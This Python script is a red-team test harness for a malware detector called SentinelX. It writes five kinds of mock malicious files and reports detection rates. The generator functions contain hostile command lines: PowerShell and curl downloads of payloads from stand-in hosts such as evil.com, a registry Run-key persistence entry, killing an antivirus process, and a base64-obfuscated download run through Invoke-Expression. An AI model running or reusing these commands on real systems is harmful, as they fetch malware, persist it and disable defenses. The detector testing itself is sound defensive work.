"""
red_team.py — Red Team Testing Program for SentinelX

Generates 5 types of malicious files and tests how well
SentinelX detects each type. Produces a detailed report.

Attack types:
    1. Obvious      — clear keywords, detected by heuristic
    2. Obfuscated   — base64 encoded, no plain keywords
    3. Low-entropy  — malicious intent but looks like normal text
    4. Spoofed ext  — malware disguised as .txt or .log
    5. Polymorphic  — different content each time, same effect

Run:
    python red_team.py
"""

import os
import sys
import base64
import random
import string
import shutil
import tempfile
import time

os.chdir(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.getcwd())

from core.heuristic_engine import heuristic_analysis
from core.hash_checker import is_malicious_hash
from ai.model import predict_file, is_model_ready

# ── цвета ───────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"


# ════════════════════════════════════════════════════════════════════════════
# ГЕНЕРАТОРЫ АТАК
# ════════════════════════════════════════════════════════════════════════════

def attack_obvious(path):
    """
    Type 1 — Obvious malware.
    Contains clear suspicious keywords and a dangerous extension.
    Expected: caught by heuristic immediately.
    """
    with open(path, "w", encoding="utf-8") as f:
        f.write("@echo off\n")
        f.write("powershell -hidden -command wget http://evil.com/payload.exe\n")
        f.write("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d malware.bat\n")
        f.write("taskkill /F /IM antivirus.exe\n")
        f.write("curl -O http://c2.server.net/backdoor.dll\n")


def attack_obfuscated(path):
    """
    Type 2 — Obfuscated malware.
    Real payload encoded in base64 — no plain keywords visible.
    Expected: missed by heuristic, caught by AI (base64_score feature).
    """
    # encode a real malicious command
    payload = "powershell -hidden -command wget http://evil.com/rat.exe"
    encoded = base64.b64encode(payload.encode()).decode()

    with open(path, "w", encoding="utf-8") as f:
        f.write("# System update script\n")
        f.write(f"$encoded = '{encoded}'\n")
        f.write("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))\n")
        f.write("Invoke-Expression $decoded\n")

        # add more base64 blobs to increase base64_score
        for _ in range(3):
            extra = base64.b64encode(os.urandom(40)).decode()
            f.write(f"# config: {extra}\n")


def attack_low_entropy(path):
    """
    Type 3 — Low entropy attack.
    Malicious intent disguised as readable prose.
    No keywords, low entropy — hardest to detect.
    Expected: likely missed by both heuristic and AI.
    This is an intentional weakness shown in the report.
    """
    with open(path, "w", encoding="utf-8") as f:
        f.write("Dear system administrator,\n\n")
        f.write("Please run the attached maintenance routine at your earliest convenience.\n")
        f.write("The routine will optimize registry performance and network connectivity.\n")
        f.write("Contact support if you experience any issues during execution.\n\n")
        f.write("Best regards,\nIT Department\n\n")
        # hidden instruction buried in normal-looking text
        f.write("Note: execute via shell using standard interpreter flags for silent mode.\n")
        f.write("Target: system binary manager, network downloader utility, process terminator.\n")


def attack_spoofed_ext(path):
    """
    Type 4 — Extension spoofing.
    Dangerous content but saved as .txt — tricks extension-based detection.
    Expected: missed by heuristic (no suspicious ext), caught by AI (keywords).
    """
    with open(path, "w", encoding="utf-8") as f:
        f.write("powershell -hidden wget http://malware.net/payload\n")
        f.write("reg add HKLM\\run /v evil /t REG_SZ /d c:\\malware.exe\n")
        f.write("taskkill /F /IM defender.exe\n")
        f.write("curl -O http://c2.server/backdoor\n")


def attack_polymorphic(path):
    """
    Type 5 — Polymorphic malware.
    Each run generates a different-looking file with the same effect.
    Random variable names, random comments, shuffled commands.
    Expected: tests if AI catches varying patterns.
    """
    # randomise variable names
    var1 = "".join(random.choices(string.ascii_lowercase, k=8))
    var2 = "".join(random.choices(string.ascii_lowercase, k=6))
    comment = "".join(random.choices(string.ascii_letters + string.digits, k=20))

    commands = [
        f"powershell -hidden -enc {base64.b64encode(os.urandom(30)).decode()}",
        f"wget http://{''.join(random.choices(string.ascii_lowercase, k=8))}.net/payload",
        f"reg add HKLM\\Software\\{comment} /v {var1} /t REG_SZ /d {var2}.exe",
        f"taskkill /F /IM {''.join(random.choices(string.ascii_lowercase, k=6))}.exe",
        f"curl -O http://{''.join(random.choices(string.ascii_lowercase, k=6))}.ru/dropper",
    ]
    random.shuffle(commands)

    with open(path, "w", encoding="utf-8") as f:
        f.write(f"@echo off\n:: {comment}\n")
        for cmd in commands:
            f.write(f"{cmd}\n")


# ════════════════════════════════════════════════════════════════════════════
# ТЕСТИРОВАНИЕ ОДНОГО ФАЙЛА
# ════════════════════════════════════════════════════════════════════════════

def test_file(file_path, ai_available):
    """
    Runs all detectors on a single file.
    Returns a result dict.
    """
    result = {
        "path":             file_path,
        "hash_caught":      False,
        "heuristic_risk":   "LOW",
        "heuristic_caught": False,
        "ai_label":         None,
        "ai_confidence":    None,
        "ai_caught":        False,
        "caught":           False,
        "method":           "MISSED",
    }

    # 1. Hash check
    result["hash_caught"] = is_malicious_hash(file_path)

    # 2. Heuristic
    risk = heuristic_analysis(file_path)
    result["heuristic_risk"] = risk
    result["heuristic_caught"] = (risk == "HIGH")

    # 3. AI
    if ai_available:
        prediction = predict_file(file_path)
        if prediction:
            result["ai_label"]      = prediction["label"]
            result["ai_confidence"] = prediction["confidence"]
            result["ai_caught"]     = (prediction["label"] == "MALWARE")

    # Overall verdict
    if result["hash_caught"] or result["heuristic_caught"] or result["ai_caught"]:
        result["caught"] = True
        methods = []
        if result["hash_caught"]:      methods.append("Hash")
        if result["heuristic_caught"]: methods.append("Heuristic")
        if result["ai_caught"]:        methods.append("AI")
        result["method"] = " + ".join(methods)

    return result


# ════════════════════════════════════════════════════════════════════════════
# ГЛАВНАЯ ФУНКЦИЯ
# ════════════════════════════════════════════════════════════════════════════

ATTACK_TYPES = [
    {
        "id":          1,
        "name":        "Obvious",
        "description": "Clear keywords + dangerous extension",
        "ext":         ".bat",
        "generator":   attack_obvious,
        "expected":    "Heuristic",
    },
    {
        "id":          2,
        "name":        "Obfuscated",
        "description": "Base64-encoded payload, no plain keywords",
        "ext":         ".ps1",
        "generator":   attack_obfuscated,
        "expected":    "AI",
    },
    {
        "id":          3,
        "name":        "Low Entropy",
        "description": "Malicious intent hidden in normal-looking text",
        "ext":         ".txt",
        "generator":   attack_low_entropy,
        "expected":    "MISSED (intentional weakness)",
    },
    {
        "id":          4,
        "name":        "Spoofed Extension",
        "description": "Dangerous content disguised as .txt file",
        "ext":         ".txt",
        "generator":   attack_spoofed_ext,
        "expected":    "AI",
    },
    {
        "id":          5,
        "name":        "Polymorphic",
        "description": "Randomised structure, different every time",
        "ext":         ".bat",
        "generator":   attack_polymorphic,
        "expected":    "Heuristic or AI",
    },
]

RUNS_PER_TYPE = 5   # run each attack type N times for statistical reliability


def run_red_team():
    print(f"\n{BOLD}{CYAN}{'═'*60}{RESET}")
    print(f"{BOLD}{CYAN}   SENTINELX — RED TEAM TESTING PROGRAM{RESET}")
    print(f"{BOLD}{CYAN}{'═'*60}{RESET}")
    print(f"  Each attack type runs {RUNS_PER_TYPE} times for reliability.\n")

    ai_available = is_model_ready()
    if ai_available:
        print(f"  {GREEN}✓ AI model loaded{RESET}")
    else:
        print(f"  {YELLOW}⚠ AI model not found — run python -m ai.trainer first{RESET}")
        print(f"  {YELLOW}  AI detection column will show N/A{RESET}")

    # work in a temp folder so we don't pollute the project
    work_dir = tempfile.mkdtemp(prefix="sentinelx_redteam_")
    print(f"\n  Working directory: {DIM}{work_dir}{RESET}\n")

    all_results   = []
    type_summaries = []

    for attack in ATTACK_TYPES:
        print(f"{BOLD}{'─'*60}{RESET}")
        print(f"{BOLD}  Attack {attack['id']}: {attack['name']}{RESET}")
        print(f"  {DIM}{attack['description']}{RESET}")
        print(f"  Expected: {CYAN}{attack['expected']}{RESET}\n")

        type_caught   = 0
        heuristic_hit = 0
        ai_hit        = 0

        for run in range(1, RUNS_PER_TYPE + 1):
            fname = f"attack_{attack['id']}_run{run}{attack['ext']}"
            fpath = os.path.join(work_dir, fname)

            attack["generator"](fpath)
            result = test_file(fpath, ai_available)
            result["attack_type"] = attack["name"]
            all_results.append(result)

            if result["caught"]:
                type_caught += 1
                icon  = f"{GREEN}✓{RESET}"
                color = GREEN
            else:
                icon  = f"{RED}✗{RESET}"
                color = RED

            h_risk = result["heuristic_risk"]
            h_color = RED if h_risk == "HIGH" else (YELLOW if h_risk == "MEDIUM" else DIM)

            ai_str = "N/A"
            if result["ai_label"] is not None:
                ai_color = RED if result["ai_label"] == "MALWARE" else GREEN
                ai_str = f"{ai_color}{result['ai_label']} {result['ai_confidence']:.0%}{RESET}"

            if result["heuristic_caught"]: heuristic_hit += 1
            if result["ai_caught"]:        ai_hit        += 1

            print(f"  Run {run}  {icon}  "
                  f"Heuristic: {h_color}{h_risk}{RESET}  "
                  f"AI: {ai_str}  "
                  f"→ {color}{result['method']}{RESET}")

        detection_rate = type_caught / RUNS_PER_TYPE * 100
        type_summaries.append({
            "name":           attack["name"],
            "caught":         type_caught,
            "total":          RUNS_PER_TYPE,
            "rate":           detection_rate,
            "heuristic_hits": heuristic_hit,
            "ai_hits":        ai_hit,
            "expected":       attack["expected"],
        })

        rate_color = GREEN if detection_rate >= 80 else (YELLOW if detection_rate >= 40 else RED)
        print(f"\n  Detection rate: {rate_color}{BOLD}{detection_rate:.0f}%{RESET} "
              f"({type_caught}/{RUNS_PER_TYPE})\n")

    # ── Финальный отчёт ─────────────────────────────────────────────────────
    total_attacks = len(all_results)
    total_caught  = sum(1 for r in all_results if r["caught"])
    total_missed  = total_attacks - total_caught
    overall_rate  = total_caught / total_attacks * 100

    heuristic_only = sum(1 for r in all_results if r["heuristic_caught"] and not r["ai_caught"])
    ai_only        = sum(1 for r in all_results if r["ai_caught"] and not r["heuristic_caught"])
    both           = sum(1 for r in all_results if r["heuristic_caught"] and r["ai_caught"])

    print(f"\n{BOLD}{CYAN}{'═'*60}{RESET}")
    print(f"{BOLD}{CYAN}   FINAL REPORT{RESET}")
    print(f"{BOLD}{CYAN}{'═'*60}{RESET}\n")

    print(f"  {'Attack Type':<20} {'Caught':>6} {'Total':>5} {'Rate':>6}  {'Expected'}")
    print(f"  {'─'*58}")

    for s in type_summaries:
        rate_color = GREEN if s["rate"] >= 80 else (YELLOW if s["rate"] >= 40 else RED)
        print(f"  {s['name']:<20} {s['caught']:>6} {s['total']:>5} "
              f"{rate_color}{s['rate']:>5.0f}%{RESET}  {DIM}{s['expected']}{RESET}")

    print(f"\n  {'─'*58}")
    print(f"  {'TOTAL':<20} {total_caught:>6} {total_attacks:>5} ", end="")
    rate_color = GREEN if overall_rate >= 80 else (YELLOW if overall_rate >= 60 else RED)
    print(f"{rate_color}{BOLD}{overall_rate:>5.0f}%{RESET}")

    print(f"\n  {BOLD}Detection breakdown:{RESET}")
    print(f"  Heuristic only:  {heuristic_only:>3} attacks")
    print(f"  AI only:         {ai_only:>3} attacks")
    print(f"  Both methods:    {both:>3} attacks")
    print(f"  {RED}Missed:          {total_missed:>3} attacks{RESET}")

    print(f"\n  {BOLD}Conclusions:{RESET}")
    for s in type_summaries:
        if s["rate"] == 100:
            print(f"  {GREEN}✓{RESET} {s['name']}: fully detected ({s['heuristic_hits']} heuristic, {s['ai_hits']} AI)")
        elif s["rate"] == 0:
            print(f"  {RED}✗{RESET} {s['name']}: not detected — {DIM}known limitation{RESET}")
        else:
            print(f"  {YELLOW}~{RESET} {s['name']}: partially detected ({s['rate']:.0f}%)")

    print(f"\n  {BOLD}Overall detection rate: ", end="")
    print(f"{rate_color}{overall_rate:.0f}%{RESET}\n")

    # cleanup
    shutil.rmtree(work_dir, ignore_errors=True)

    print(f"{BOLD}{CYAN}{'═'*60}{RESET}")
    print(f"  Test complete. Temp files cleaned up.")
    print(f"{BOLD}{CYAN}{'═'*60}{RESET}\n")


if __name__ == "__main__":
    run_red_team()
